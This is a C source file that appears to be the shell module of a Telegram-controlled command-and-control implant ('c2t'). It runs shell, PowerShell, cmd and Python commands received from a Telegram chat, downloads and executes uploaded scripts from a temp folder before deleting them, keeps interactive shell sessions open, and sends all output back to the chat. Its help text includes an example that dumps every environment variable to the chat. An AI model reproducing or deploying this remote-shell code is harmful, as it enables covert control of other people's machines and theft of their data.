/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "shell_output.h"
#include "../config/config.h"
#include "../logging/logging.h"
#include "../telegram/telegram.h"

#ifdef _WIN32
#include "../win32/win32_api.h"
#else
#include <sys/stat.h>
#include <unistd.h>
#endif

#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

static void strip_ansi_escapes_in_place(char *str) {
  if (!str)
    return;
  char *src = str;
  char *dst = str;
  while (*src) {
    if ((unsigned char)*src == 0x1B) { /* ESC */
      src++;
      if (*src == '[') {
        src++;
        while (*src && !(*src >= 0x40 && *src <= 0x7E)) {
          src++;
        }
        if (*src)
          src++;
      } else if (*src == ']' || *src == '(' || *src == ')') {
        src++;
        while (*src && *src != 0x07 && (unsigned char)*src != 0x1B) {
          src++;
        }
        if (*src == 0x07)
          src++;
      }
    } else if (*src == '\r' && *(src + 1) == '\n') {
      *dst++ = '\n';
      src += 2;
    } else if (*src == '\r') {
      *dst++ = '\n';
      src++;
    } else {
      *dst++ = *src++;
    }
  }
  *dst = '\0';
}

static void append_escaped_html(char *output, size_t *offset, size_t capacity,
                                const char *input) {
  if (!input || !output || !offset)
    return;
  while (*input && *offset + 6 < capacity) {
    if (*input == '&') {
      memcpy(output + *offset, "&amp;", 5);
      *offset += 5;
    } else if (*input == '<') {
      memcpy(output + *offset, "&lt;", 4);
      *offset += 4;
    } else if (*input == '>') {
      memcpy(output + *offset, "&gt;", 4);
      *offset += 4;
    } else {
      output[(*offset)++] = *input;
    }
    input++;
  }
  output[*offset] = '\0';
}

static int is_all_whitespace(const char *str) {
  if (!str)
    return 1;
  while (*str) {
    if (!isspace((unsigned char)*str))
      return 0;
    str++;
  }
  return 1;
}

int c2t_shell_format_telegram(const char *command,
                              const c2t_shell_result_t *result, char *output,
                              size_t capacity) {
  if (!output || capacity < 128)
    return 0;

  output[0] = '\0';
  size_t offset = 0;

  if (!result || result->execution_error) {
    static const char err_hdr[] = "⚠️ <b>Shell Execution Failed</b>\n<b>Command:</b> <code>";
    memcpy(output, err_hdr, sizeof(err_hdr) - 1);
    offset = sizeof(err_hdr) - 1;
    append_escaped_html(output, &offset, capacity, command ? command : "(null)");
    static const char err_tail[] = "</code>\n<i>Unable to spawn child process or pipeline.</i>";
    size_t t_len = strlen(err_tail);
    if (offset + t_len < capacity) {
      memcpy(output + offset, err_tail, t_len);
      offset += t_len;
    }
    output[offset] = '\0';
    return 1;
  }

  char header[256];
  if (result->timed_out) {
    snprintf(header, sizeof(header),
             "⏱️ <b>Shell Timeout</b> (⏱️ %llu ms)\n<b>Command:</b> <code>",
             (unsigned long long)result->duration_ms);
  } else if (result->exit_code == 0) {
    snprintf(header, sizeof(header),
             "⚡ <b>Shell Output</b> (✅ Exit: 0, ⏱️ %llu ms)\n<b>Command:</b> <code>",
             (unsigned long long)result->duration_ms);
  } else {
    snprintf(header, sizeof(header),
             "⚡ <b>Shell Output</b> (❌ Exit: %d, ⏱️ %llu ms)\n<b>Command:</b> <code>",
             result->exit_code, (unsigned long long)result->duration_ms);
  }

  size_t h_len = strlen(header);
  if (h_len < capacity) {
    memcpy(output, header, h_len);
    offset = h_len;
  }

  append_escaped_html(output, &offset, capacity - 128, command ? command : "");

  static const char cmd_close[] = "</code>\n\n";
  if (offset + sizeof(cmd_close) - 1 < capacity) {
    memcpy(output + offset, cmd_close, sizeof(cmd_close) - 1);
    offset += sizeof(cmd_close) - 1;
  }

  if (!result->output || result->output_len == 0 || is_all_whitespace(result->output)) {
    static const char empty_body[] = "<i>(No output returned)</i>";
    size_t eb_len = strlen(empty_body);
    if (offset + eb_len < capacity) {
      memcpy(output + offset, empty_body, eb_len);
      offset += eb_len;
    }
  } else {
    static const char pre_open[] = "<pre><code class=\"language-shell\">";
    if (offset + sizeof(pre_open) - 1 < capacity) {
      memcpy(output + offset, pre_open, sizeof(pre_open) - 1);
      offset += sizeof(pre_open) - 1;
    }

    append_escaped_html(output, &offset, capacity - 64, result->output);

    static const char pre_close[] = "</code></pre>";
    if (offset + sizeof(pre_close) - 1 < capacity) {
      memcpy(output + offset, pre_close, sizeof(pre_close) - 1);
      offset += sizeof(pre_close) - 1;
    }
  }

  output[offset] = '\0';
  return 1;
}

static int send_shell_result(const char *cmd_display, c2t_shell_result_t *result,
                             int exec_ok) {
  if (!exec_ok) {
    c2t_log_error("shell", "Execution failed for: '%s'", cmd_display);
    char err_msg[1024];
    (void)c2t_shell_format_telegram(cmd_display, result, err_msg, sizeof(err_msg));
    c2t_shell_result_free(result);
    return telegram_send_html(err_msg);
  }

  if (result->output) {
    strip_ansi_escapes_in_place(result->output);
    result->output_len = strlen(result->output);
  }

  int sent = 0;
  if (result->output && result->output_len > 3000) {
    char filename[64];
    snprintf(filename, sizeof(filename), "cmd_output_%llu.log",
             (unsigned long long)time(nullptr));

    char preview[3200];
    char preview_output[2000];
    size_t copy_len = result->output_len < 1800 ? result->output_len : 1800;
    memcpy(preview_output, result->output, copy_len);
    preview_output[copy_len] = '\0';

    c2t_shell_result_t preview_res = *result;
    preview_res.output = preview_output;
    preview_res.output_len = copy_len;

    (void)c2t_shell_format_telegram(cmd_display, &preview_res, preview, sizeof(preview));

    size_t p_len = strlen(preview);
    static const char doc_note[] = "\n\n📄 <i>(Output truncated. Full output attached as file.)</i>";
    if (p_len + sizeof(doc_note) < sizeof(preview)) {
      memcpy(preview + p_len, doc_note, sizeof(doc_note));
    }

    telegram_send_html(preview);
    sent = telegram_send_file(result->output, result->output_len, "text/plain",
                              filename, nullptr);
  } else {
    char response[3900];
    (void)c2t_shell_format_telegram(cmd_display, result, response, sizeof(response));
    sent = telegram_send_html(response);
  }

  c2t_shell_result_free(result);
  return sent;
}

int c2t_shell_run_and_send(const char *command) {
  if (!command || !*command) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/sh &lt;command&gt;</code>\n"
        "<i>Execute command in default OS shell.</i>\n\n"
        "<i>Multi-Shell Commands:</i>\n"
        "• <code>/ps &lt;command&gt;</code> - PowerShell execution\n"
        "• <code>/bash &lt;command&gt;</code> - Bash execution\n"
        "• <code>/cmd &lt;command&gt;</code> - CMD execution\n"
        "• <code>/py &lt;command&gt;</code> - Python execution\n"
        "• <code>/sh_in &lt;input&gt;</code> - Interactive session input\n\n"
        "💡 <i>Tip: Send any script file (e.g. .sh, .bat, .ps1, .py) as attachment with caption <code>/run</code> to execute.</i>");
  }

  c2t_log_info("shell", "Executing shell command: '%s'", command);

  (void)telegram_send_chat_action("typing");
  (void)telegram_send_message_draft(201, "⚡ <i>Executing command...</i>");

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute(command, &result, C2T_SHELL_DEFAULT_TIMEOUT_MS);
  return send_shell_result(command, &result, exec_ok);
}

int c2t_shell_run_powershell_and_send(const char *command) {
  if (!command || !*command) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/ps &lt;command&gt;</code>\n"
        "<i>Execute command directly via PowerShell.</i>\n\n"
        "<i>Examples:</i>\n"
        "• <code>/ps Get-Process | Select-Object -First 10</code>\n"
        "• <code>/ps Get-Service | Where-Object {$_.Status -eq 'Running'}</code>\n"
        "• <code>/ps $PSVersionTable</code>");
  }

  c2t_log_info("shell", "Executing PowerShell command: '%s'", command);

  (void)telegram_send_chat_action("typing");
  (void)telegram_send_message_draft(202, "⚡ <i>Executing PowerShell...</i>");

  c2t_shell_options_t opts = {
      .command = command,
      .shell_type = C2T_SHELL_POWERSHELL,
      .stdin_data = nullptr,
      .stdin_data_len = 0,
      .timeout_ms = C2T_SHELL_DEFAULT_TIMEOUT_MS,
      .working_dir = nullptr,
  };

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_ex(&opts, &result);
  char disp[256];
  snprintf(disp, sizeof(disp), "powershell: %s", command);
  return send_shell_result(disp, &result, exec_ok);
}

int c2t_shell_run_bash_and_send(const char *command) {
  if (!command || !*command) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/bash &lt;command&gt;</code>\n"
        "<i>Execute command directly via GNU Bash.</i>\n\n"
        "<i>Examples:</i>\n"
        "• <code>/bash uname -a && id</code>\n"
        "• <code>/bash for i in {1..5}; do echo $i; done</code>");
  }

  c2t_log_info("shell", "Executing Bash command: '%s'", command);

  (void)telegram_send_chat_action("typing");
  (void)telegram_send_message_draft(203, "⚡ <i>Executing Bash...</i>");

  c2t_shell_options_t opts = {
      .command = command,
      .shell_type = C2T_SHELL_BASH,
      .stdin_data = nullptr,
      .stdin_data_len = 0,
      .timeout_ms = C2T_SHELL_DEFAULT_TIMEOUT_MS,
      .working_dir = nullptr,
  };

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_ex(&opts, &result);
  char disp[256];
  snprintf(disp, sizeof(disp), "bash: %s", command);
  return send_shell_result(disp, &result, exec_ok);
}

int c2t_shell_run_cmd_and_send(const char *command) {
  if (!command || !*command) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/cmd &lt;command&gt;</code>\n"
        "<i>Execute command directly via Command Prompt (cmd.exe).</i>\n\n"
        "<i>Examples:</i>\n"
        "• <code>/cmd dir /w</code>\n"
        "• <code>/cmd netstat -ano</code>");
  }

  c2t_log_info("shell", "Executing CMD command: '%s'", command);

  (void)telegram_send_chat_action("typing");
  (void)telegram_send_message_draft(204, "⚡ <i>Executing CMD...</i>");

  c2t_shell_options_t opts = {
      .command = command,
      .shell_type = C2T_SHELL_CMD,
      .stdin_data = nullptr,
      .stdin_data_len = 0,
      .timeout_ms = C2T_SHELL_DEFAULT_TIMEOUT_MS,
      .working_dir = nullptr,
  };

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_ex(&opts, &result);
  char disp[256];
  snprintf(disp, sizeof(disp), "cmd: %s", command);
  return send_shell_result(disp, &result, exec_ok);
}

int c2t_shell_run_python_and_send(const char *command) {
  if (!command || !*command) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/py &lt;one-liner&gt;</code>\n"
        "<i>Execute inline Python code.</i>\n\n"
        "<i>Examples:</i>\n"
        "• <code>/py import sys, platform; print(platform.platform())</code>\n"
        "• <code>/py import json, os; print(json.dumps(dict(os.environ), indent=2))</code>");
  }

  c2t_log_info("shell", "Executing Python snippet: '%s'", command);

  (void)telegram_send_chat_action("typing");
  (void)telegram_send_message_draft(205, "⚡ <i>Executing Python...</i>");

  c2t_shell_options_t opts = {
      .command = command,
      .shell_type = C2T_SHELL_PYTHON,
      .stdin_data = nullptr,
      .stdin_data_len = 0,
      .timeout_ms = C2T_SHELL_DEFAULT_TIMEOUT_MS,
      .working_dir = nullptr,
  };

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_ex(&opts, &result);
  char disp[256];
  snprintf(disp, sizeof(disp), "python: %s", command);
  return send_shell_result(disp, &result, exec_ok);
}

int c2t_shell_run_with_input_and_send(const char *command, const char *stdin_data) {
  if (!command || !*command) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/stdin &lt;command&gt; | &lt;input&gt;</code>\n"
        "<i>Execute command and feed standard input.</i>");
  }

  c2t_log_info("shell", "Executing command with STDIN: '%s'", command);

  (void)telegram_send_chat_action("typing");
  (void)telegram_send_message_draft(206, "⚡ <i>Piping STDIN to process...</i>");

  c2t_shell_options_t opts = {
      .command = command,
      .shell_type = C2T_SHELL_AUTO,
      .stdin_data = stdin_data,
      .stdin_data_len = stdin_data ? strlen(stdin_data) : 0,
      .timeout_ms = C2T_SHELL_DEFAULT_TIMEOUT_MS,
      .working_dir = nullptr,
  };

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_ex(&opts, &result);
  return send_shell_result(command, &result, exec_ok);
}

int c2t_shell_run_script_file_and_send(const char *script_path, const char *args) {
  if (!script_path || !*script_path) {
    return telegram_send_html(
        "⚠️ <b>Usage:</b> <code>/runfile &lt;script_path&gt; [arguments]</code>\n"
        "<i>Aliases:</i> <code>/execfile</code>, <code>/script</code>\n"
        "<i>Examples:</i>\n"
        "• <code>/runfile /tmp/deploy.sh --verbose</code>\n"
        "• <code>/runfile C:\\scripts\\audit.ps1</code>\n\n"
        "💡 <i>Tip: Send any script file directly as an attachment in this chat with caption <code>/run</code> to upload and execute it.</i>");
  }

  c2t_log_info("shell", "Executing local script file: '%s' args='%s'",
               script_path, args ? args : "");

  (void)telegram_send_chat_action("typing");
  (void)telegram_send_message_draft(207, "📜 <i>Executing script file...</i>");

  char cmd_display[256];
  if (args && *args) {
    snprintf(cmd_display, sizeof(cmd_display), "%s %s", script_path, args);
  } else {
    snprintf(cmd_display, sizeof(cmd_display), "%s", script_path);
  }

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_script_file(script_path, args, &result,
                                             C2T_SHELL_SCRIPT_TIMEOUT_MS);
  return send_shell_result(cmd_display, &result, exec_ok);
}

int c2t_shell_run_uploaded_script(const char *file_id, const char *file_name,
                                  const char *caption) {
  const c2t_config_t *config = c2t_config_get();
  if (!config->telegram_enabled || !config->telegram_bot_token ||
      !config->telegram_chat_id) {
    c2t_log_warning("shell", "Cannot execute uploaded script: Telegram unconfigured");
    return 0;
  }
  if (!file_id || !*file_id) {
    c2t_log_error("shell", "Cannot execute script: file_id is empty");
    return 0;
  }

  (void)telegram_send_chat_action("typing");
  (void)telegram_send_message_draft(208, "📜 <i>Downloading and running uploaded script...</i>");

  char clean_name[128] = {};
  if (file_name && *file_name) {
    size_t j = 0;
    for (size_t i = 0; file_name[i] && j + 1 < sizeof(clean_name); i++) {
      char c = file_name[i];
      if (isalnum((unsigned char)c) || c == '.' || c == '_' || c == '-') {
        clean_name[j++] = c;
      } else {
        clean_name[j++] = '_';
      }
    }
    clean_name[j] = '\0';
  }
  if (!clean_name[0]) {
#ifdef _WIN32
    strncpy(clean_name, "script.bat", sizeof(clean_name) - 1);
#else
    strncpy(clean_name, "script.sh", sizeof(clean_name) - 1);
#endif
  }

  /* Parse script arguments or custom command prefix from caption */
  const char *cap = caption ? caption : "";
  while (isspace((unsigned char)*cap))
    cap++;

  if (strncmp(cap, "/runscript", 10) == 0 && (cap[10] == ' ' || cap[10] == '\0')) cap += 10;
  else if (strncmp(cap, "/execfile", 9) == 0 && (cap[9] == ' ' || cap[9] == '\0')) cap += 9;
  else if (strncmp(cap, "/runfile", 8) == 0 && (cap[8] == ' ' || cap[8] == '\0')) cap += 8;
  else if (strncmp(cap, "/powershell", 11) == 0 && (cap[11] == ' ' || cap[11] == '\0')) cap += 11;
  else if (strncmp(cap, "/terminal", 9) == 0 && (cap[9] == ' ' || cap[9] == '\0')) cap += 9;
  else if (strncmp(cap, "/script", 7) == 0 && (cap[7] == ' ' || cap[7] == '\0')) cap += 7;
  else if (strncmp(cap, "/shell", 6) == 0 && (cap[6] == ' ' || cap[6] == '\0')) cap += 6;
  else if (strncmp(cap, "/bash", 5) == 0 && (cap[5] == ' ' || cap[5] == '\0')) cap += 5;
  else if (strncmp(cap, "/exec", 5) == 0 && (cap[5] == ' ' || cap[5] == '\0')) cap += 5;
  else if (strncmp(cap, "/cmd", 4) == 0 && (cap[4] == ' ' || cap[4] == '\0')) cap += 4;
  else if (strncmp(cap, "/run", 4) == 0 && (cap[4] == ' ' || cap[4] == '\0')) cap += 4;
  else if (strncmp(cap, "/sh", 3) == 0 && (cap[3] == ' ' || cap[3] == '\0')) cap += 3;
  else if (strncmp(cap, "/ps", 3) == 0 && (cap[3] == ' ' || cap[3] == '\0')) cap += 3;
  else if (strncmp(cap, "/py", 3) == 0 && (cap[3] == ' ' || cap[3] == '\0')) cap += 3;

  while (isspace((unsigned char)*cap))
    cap++;

  /* Build unique temp file path */
  char temp_path[512] = {};
  uint64_t ts = (uint64_t)time(nullptr);
  uint32_t r = (uint32_t)rand();

#ifdef _WIN32
  char tmp_dir[MAX_PATH] = {};
  if (g_c2t_win32.GetEnvironmentVariableA) {
    if (g_c2t_win32.GetEnvironmentVariableA("TEMP", tmp_dir, sizeof(tmp_dir)) == 0) {
      strncpy(tmp_dir, ".", sizeof(tmp_dir) - 1);
    }
  } else {
    strncpy(tmp_dir, ".", sizeof(tmp_dir) - 1);
  }
  snprintf(temp_path, sizeof(temp_path), "%s\\c2t_scr_%llu_%u_%s", tmp_dir,
           (unsigned long long)ts, (unsigned int)(r % 10000), clean_name);
#else
  snprintf(temp_path, sizeof(temp_path), "/tmp/c2t_scr_%llu_%u_%s",
           (unsigned long long)ts, (unsigned int)(r % 10000), clean_name);
#endif

  c2t_log_info("shell", "Downloading uploaded script '%s' (file_id: %s) to '%s'...",
               clean_name, file_id, temp_path);

  size_t downloaded_bytes = 0;
  int dl_ok = telegram_download_file(config->telegram_bot_token, file_id,
                                     temp_path, config->telegram_max_file_bytes,
                                     &downloaded_bytes);
  if (!dl_ok) {
    c2t_log_error("shell", "Failed to download uploaded script '%s'", clean_name);
    char err_msg[1024];
    snprintf(err_msg, sizeof(err_msg),
             "❌ <b>Script Download Failed</b>\n\n"
             "• <b>Script:</b> <code>%s</code>\n"
             "• <b>Reason:</b> <i>Unable to download file from Telegram (check bot token and max size limit).</i>",
             clean_name);
    return telegram_send_html(err_msg);
  }

#ifndef _WIN32
  (void)chmod(temp_path, 0700);
#endif

  c2t_log_info("shell", "Executing downloaded script '%s' (%llu bytes) with args='%s'",
               temp_path, (unsigned long long)downloaded_bytes, cap);

  char cmd_display[256];
  if (*cap) {
    snprintf(cmd_display, sizeof(cmd_display), "%s %s", clean_name, cap);
  } else {
    snprintf(cmd_display, sizeof(cmd_display), "%s", clean_name);
  }

  c2t_shell_result_t result;
  int exec_ok = c2t_shell_execute_script_file(temp_path, cap, &result,
                                             C2T_SHELL_SCRIPT_TIMEOUT_MS);

  /* Clean up temporary script file from disk */
  (void)remove(temp_path);

  return send_shell_result(cmd_display, &result, exec_ok);
}

static int c2t_strcasecmp(const char *left, const char *right) {
  if (!left && !right)
    return 0;
  if (!left)
    return -1;
  if (!right)
    return 1;
#ifdef _WIN32
  return _stricmp(left, right);
#else
  return strcasecmp(left, right);
#endif
}

int c2t_shell_session_handle_command(const char *subcommand, const char *arg) {
  const char *sub = subcommand ? subcommand : "";
  while (isspace((unsigned char)*sub))
    sub++;

  if (c2t_strcasecmp(sub, "start") == 0 || c2t_strcasecmp(sub, "open") == 0 ||
      c2t_strcasecmp(sub, "spawn") == 0) {
    c2t_shell_type_t st = C2T_SHELL_AUTO;
    if (arg && *arg) {
      while (isspace((unsigned char)*arg)) arg++;
      if (c2t_strcasecmp(arg, "bash") == 0) st = C2T_SHELL_BASH;
      else if (c2t_strcasecmp(arg, "zsh") == 0) st = C2T_SHELL_ZSH;
      else if (c2t_strcasecmp(arg, "ps") == 0 || c2t_strcasecmp(arg, "powershell") == 0 || c2t_strcasecmp(arg, "pwsh") == 0) st = C2T_SHELL_POWERSHELL;
      else if (c2t_strcasecmp(arg, "cmd") == 0) st = C2T_SHELL_CMD;
      else if (c2t_strcasecmp(arg, "py") == 0 || c2t_strcasecmp(arg, "python") == 0 || c2t_strcasecmp(arg, "python3") == 0) st = C2T_SHELL_PYTHON;
    }
    char msg[3000];
    (void)c2t_shell_session_start(st, msg, sizeof(msg));
    return telegram_send_html(msg);
  }

  if (c2t_strcasecmp(sub, "in") == 0 || c2t_strcasecmp(sub, "input") == 0 ||
      c2t_strcasecmp(sub, "write") == 0 || c2t_strcasecmp(sub, "send") == 0) {
    if (!arg || !*arg) {
      return telegram_send_html(
          "⚠️ <b>Usage:</b> <code>/sh_in &lt;command/text&gt;</code>\n"
          "<i>Send input string into the currently active interactive shell session.</i>");
    }
    (void)telegram_send_chat_action("typing");
    (void)telegram_send_message_draft(209, "⌨️ <i>Forwarding input to interactive shell session...</i>");
    c2t_shell_result_t res;
    int ok = c2t_shell_session_write(arg, strlen(arg), &res, 1200);
    if (!ok) {
      return telegram_send_html(
          "⚠️ <b>Interactive Session Not Active</b>\n"
          "<i>No interactive shell session is running. Use <code>/sh_start</code> to launch one.</i>");
    }
    char disp[256];
    snprintf(disp, sizeof(disp), "in: %s", arg);
    return send_shell_result(disp, &res, 1);
  }

  if (c2t_strcasecmp(sub, "stop") == 0 || c2t_strcasecmp(sub, "exit") == 0 ||
      c2t_strcasecmp(sub, "close") == 0 || c2t_strcasecmp(sub, "kill") == 0) {
    char msg[1024];
    (void)c2t_shell_session_stop(msg, sizeof(msg));
    return telegram_send_html(msg);
  }

  if (c2t_strcasecmp(sub, "status") == 0 || c2t_strcasecmp(sub, "info") == 0) {
    c2t_shell_session_info_t info;
    if (c2t_shell_session_get_info(&info) && info.is_active) {
      char msg[1024];
      uint64_t dur = (uint64_t)time(nullptr) - (info.start_time_ms / 1000ULL);
      snprintf(msg, sizeof(msg),
               "🟢 <b>Interactive Shell Session Active</b>\n\n"
               "• <b>PID:</b> <code>%llu</code>\n"
               "• <b>Shell:</b> <code>%s</code>\n"
               "• <b>Runtime:</b> %llu s\n"
               "• <b>Traffic:</b> %llu bytes in / %llu bytes out\n\n"
               "💡 <i>Commands: <code>/sh_in &lt;input&gt;</code> | <code>/sh_stop</code></i>",
               (unsigned long long)info.pid, info.shell_name,
               (unsigned long long)dur, (unsigned long long)info.total_input_bytes,
               (unsigned long long)info.total_output_bytes);
      return telegram_send_html(msg);
    } else {
      return telegram_send_html(
          "⚪ <b>Interactive Shell Session Inactive</b>\n\n"
          "<i>No interactive session currently open.</i>\n"
          "💡 <i>Use <code>/sh_start [bash|ps|cmd|py]</code> to start one.</i>");
    }
  }

  /* Default Session Help */
  return telegram_send_html(
      "💻 <b>Interactive Shell Sessions Guide:</b>\n\n"
      "• <code>/sh_start [shell]</code> - Launch interactive session (<code>bash</code>, <code>ps</code>, <code>cmd</code>, <code>py</code>)\n"
      "• <code>/sh_in &lt;input&gt;</code> - Send input/command to running session\n"
      "• <code>/sh_status</code> - View current interactive session info\n"
      "• <code>/sh_stop</code> - Terminate interactive session");
}
